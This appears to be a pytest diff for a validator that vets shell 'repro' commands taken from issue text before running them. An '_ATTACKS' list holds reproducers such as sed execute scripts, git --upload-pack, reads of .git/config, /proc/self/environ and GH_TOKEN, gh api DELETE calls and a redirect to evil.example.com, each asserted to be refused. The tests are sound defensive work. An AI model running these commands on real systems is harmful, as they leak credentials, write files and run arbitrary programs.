@@ -330,3 +330,210 @@ def test_a_version_like_token_is_not_split_into_numbers():
     be found in the output."""
     assert vi._ints("parts[2]") == [2]
     assert 3 not in vi._ints("sha v3ab31fc3d")
+
+
+# --------------------------------------------------------------------------
+# QA round 1 on #544. Every case below is a reproducer QA ran against the first
+# version and EXECUTED: a file written, a program run, a credential printed.
+# --------------------------------------------------------------------------
+_ATTACKS = [
+    # sed's own scripts execute (`e`) and write (`w`)
+    "sed -n '1e echo PWN > /tmp/x' README.md",
+    "sed -n 's/^/id/e' README.md",
+    "sed -n 'w /tmp/x' README.md",
+    "sed 's/x/y/w /tmp/x' README.md",
+    # the exact-token `-i` ban was walked around by every other spelling
+    "sed -i.bak s/a/b/ README.md", "sed -ni p README.md",
+    "sed --in-place=.bak s/a/b/ README.md", "sed -Ei s/a/b/ README.md",
+    # programs and file writes through allow-listed executables
+    "git ls-remote --upload-pack=id .", "git diff --output=/tmp/x HEAD~1",
+    "git log --output=/tmp/x", "git log --ext-diff", "git grep -O id x",
+    "git diff --no-index /etc/passwd /dev/null", "git -c core.pager=id log",
+    "sort -o /tmp/x README.md", "uniq README.md /tmp/x", "rg --pre id x",
+    "tail -f README.md", "grep -f /etc/passwd README.md",
+    # credentials and the environment
+    "jq -n env", "jq -n '$ENV.GH_TOKEN'", "cat .git/config", "cat ./.git/config",
+    "cat -- .git/config", "cat gha-creds-x.json", "cat /etc/passwd", "ls /",
+    "head -n 5 /proc/self/environ", "cat ../x", "cat src/../.git/config",
+    # gh write flags in every spelling the exact-token ban missed
+    "gh api --method=DELETE repos/o/n/issues/1", "gh api -XDELETE repos/o/n/issues/1",
+    "gh api repos/o/n -fa=b", "gh api repos/o/n --field=a=b",
+    "gh api repos/o/n --hostname evil.example.com", "gh api graphql",
+]
+
+
+@pytest.mark.parametrize("cmd", _ATTACKS)
+def test_every_qa_round_1_reproducer_is_refused(cmd):
+    argv, why = vi.vet_shell(cmd)
+    assert argv is None, f"{cmd!r} would be EXECUTED"
+    assert why
+
+
+@pytest.mark.parametrize("cmd", [
+    "grep -c verify README.md", "grep -rn '/health' src", "gh issue view 475",
+    "git log --oneline -3", "git grep -c foo -- src", "sed -n '10,20p' README.md",
+    "sed -n '/foo/p' README.md", "head -5 README.md",
+    "gh api repos/o/n/issues --jq '.[].number'",
+])
+def test_the_flag_allow_list_still_lets_the_real_backlog_commands_through(cmd):
+    argv, why = vi.vet_shell(cmd)
+    assert argv is not None, why
+
+
+def test_a_glob_cannot_launder_a_credential_file_past_the_vet(tmp_path, monkeypatch):
+    """`cat gha-c*` is a harmless glob to the vet and the credential file after
+    expansion. The expansion is re-checked."""
+    monkeypatch.setattr(vi, "ROOT", tmp_path)
+    (tmp_path / "gha-creds-abc.json").write_text("{}")
+    argv, _ = vi.vet_shell("cat gha-c*")
+    assert argv is not None  # passes the vet: it is only a glob
+    reason = vi.check_expanded(argv, vi.expand_globs(argv))
+    assert reason and "credential" in reason
+
+
+def test_a_glob_cannot_expand_into_an_option(tmp_path, monkeypatch):
+    monkeypatch.setattr(vi, "ROOT", tmp_path)
+    (tmp_path / "-o").write_text("")
+    argv, _ = vi.vet_shell("cat ?o")
+    assert vi.check_expanded(argv, vi.expand_globs(argv))
+
+
+def test_a_credential_shape_is_redacted_before_it_is_printed():
+    out = vi.redact("origin https://x-access-token:ghs_abcdefghijklmnop1234@github.com/o/n "
+                    "and ghp_abcdefghijklmnopqrstuv")
+    assert "ghs_" not in out and "ghp_" not in out and "x-access-token:" not in out
+
+
+def test_the_child_environment_carries_no_token_except_to_gh(monkeypatch):
+    monkeypatch.setenv("GH_TOKEN", "sentinel-token")
+    monkeypatch.setenv("SOME_SECRET", "sentinel-secret")
+    assert "GH_TOKEN" not in vi._child_env("cat")
+    assert "SOME_SECRET" not in vi._child_env("cat")
+    assert vi._child_env("gh")["GH_TOKEN"] == "sentinel-token"
+
+
+def test_recursive_grep_is_told_to_skip_the_secret_files():
+    argv = vi._hardened(["grep", "-rn", "x", "."])
+    assert "--exclude-dir=.git" in argv and "--exclude=gha-creds*" in argv
+    assert vi._hardened(["grep", "-c", "x", "f"]) == ["grep", "-c", "x", "f"]
+
+
+# --- the WIRING. The first round's tests covered the helpers only; forcing
+# `trusted = True`, `if False:` and a default-on bypass flag all left the suite
+# green. These drive main() with the subprocess boundary faked.
+class _Boundary:
+    """Fake `gh issue view`, the provenance resolver, and the repro child."""
+
+    def __init__(self, monkeypatch, body, comments=(), prov_rc=0):
+        self.ran = []
+        self.prov_rc = prov_rc
+        issue = {"body": body, "comments": [{"body": c} for c in comments]}
+        import json as _json
+
+        class R:
+            def __init__(self, rc=0, out="", err=""):
+                self.returncode, self.stdout, self.stderr = rc, out, err
+
+        def fake_run(argv, *a, **k):
+            if argv[:3] == ["gh", "issue", "view"]:
+                return R(0, _json.dumps(issue))
+            if any(str(x).endswith("resolve_provenance.py") for x in argv):
+                return R(self.prov_rc, "#9  PROVENANCE -- fixture")
+            self.ran.append(argv)
+            return R(0, "7\n")
+
+        monkeypatch.setattr(vi.subprocess, "run", fake_run)
+
+
+def _main(monkeypatch, capsys, argv=("9", "--repo", "o/n")):
+    monkeypatch.setattr(vi.sys, "argv", ["validate_issue.py", *argv])
+    rc = vi.main()
+    return rc, capsys.readouterr().out
+
+
+BODY = "x\nrepro: grep -c verify README.md -> 7\n"
+
+
+def test_trusted_author_reaches_execution_and_matches(monkeypatch, capsys):
+    b = _Boundary(monkeypatch, BODY, prov_rc=0)
+    rc, out = _main(monkeypatch, capsys)
+    assert rc == 0 and "MATCHES-STATED" in out
+    assert b.ran, "a trusted author's vetted repro must run"
+
+
+@pytest.mark.parametrize("prov_rc", [1, 2, 7])
+def test_outsider_unresolved_or_odd_provenance_runs_nothing_and_exits_6(
+        monkeypatch, capsys, prov_rc):
+    b = _Boundary(monkeypatch, BODY, prov_rc=prov_rc)
+    rc, out = _main(monkeypatch, capsys)
+    assert rc == 6 and "REFUSED" in out
+    assert b.ran == [], f"the child ran for provenance rc={prov_rc}: {b.ran}"
+
+
+def test_a_bot_style_refusal_and_a_missing_repo_run_nothing(monkeypatch, capsys):
+    b = _Boundary(monkeypatch, BODY, prov_rc=0)
+    rc, out = _main(monkeypatch, capsys, argv=("9",))
+    monkeypatch.delenv("GH_REPO", raising=False)
+    rc, out = _main(monkeypatch, capsys, argv=("9", "--repo", ""))
+    assert rc == 6 and b.ran == []
+
+
+def test_there_is_no_flag_that_skips_the_provenance_check(monkeypatch, capsys):
+    b = _Boundary(monkeypatch, BODY, prov_rc=1)
+    with pytest.raises(SystemExit):
+        _main(monkeypatch, capsys, argv=("9", "--repo", "o/n", "--allow-untrusted-shell"))
+    assert b.ran == []
+
+
+def test_a_shell_repro_in_a_comment_never_executes_under_the_authors_gate(
+        monkeypatch, capsys):
+    """Anyone can comment on a public issue; provenance covers the AUTHOR.
+    QA wrote a sentinel file through exactly this."""
+    evil = "repro: sed -n '1e echo PWN > /tmp/x' README.md -> 1"
+    b = _Boundary(monkeypatch, BODY, comments=[evil], prov_rc=0)
+    rc, out = _main(monkeypatch, capsys)
+    assert rc == 6 and "COMMENT" in out
+    assert b.ran == []
+
+
+def test_a_harmless_newer_shell_comment_also_does_not_run(monkeypatch, capsys):
+    b = _Boundary(monkeypatch, BODY, comments=["repro: grep -c x README.md -> 1"])
+    rc, _ = _main(monkeypatch, capsys)
+    assert rc == 6 and b.ran == []
+
+
+def test_shell_verdicts_never_exit_1_so_they_can_never_read_as_cannot_reproduce(
+        monkeypatch, capsys):
+    """Step 0 closes ONLY on exit 1 / CANNOT-REPRODUCE. A shell verdict has no
+    polarity, so none of them may produce it."""
+    codes = set()
+    for body, out_ in [(BODY, "7\n"), ("repro: grep -c verify README.md -> 9\n", "7\n"),
+                       ("repro: python -c 1 -> 1\n", "")]:
+        _Boundary(monkeypatch, body, prov_rc=0)
+        rc, out = _main(monkeypatch, capsys)
+        codes.add(rc)
+        assert "CANNOT-REPRODUCE" not in out
+    assert 1 not in codes and codes == {0, 5, 6}
+
+
+# --- backlog coverage ------------------------------------------------------
+def test_the_bold_bullet_form_agent_discover_writes_is_found():
+    """26 of the 53 issues verify_issue_evidence counts as carrying a repro
+    used `- **repro:** ...`, and exited NO-REPRO silently."""
+    t = "- **gsc:** n/a\n- **repro:** `grep -c x README.md` -> 3\n- **ga4:** n/a"
+    assert vi.last_repro_line(t) == "`grep -c x README.md` -> 3"
+    assert vi.last_repro_line("repro: grep -c x f -> 3") == "grep -c x f -> 3"
+
+
+def test_a_for_loop_pasted_after_the_first_probe_does_not_pollute_its_expectation():
+    """#466: the second probe's `for n in 739 740 741 742; do` was read as the
+    first probe's expectation, so an intact premise reported DIFFERS."""
+    cmd, stated, probes = vi.split_shell_repro(
+        'grep -n "^| 2026-10-18" ARCHITECTURE.md -> 5 rows, 4 share a title '
+        'for n in 739 740 741 742; do grep -c x f; done')
+    assert "739" not in stated and "5 rows" in stated and probes >= 2
+
+
+def test_prose_containing_for_is_not_a_second_probe():
+    _, stated, probes = vi.split_shell_repro("grep -c x f -> 5 matches for the old name 12")
+    assert "12" in stated and probes == 1
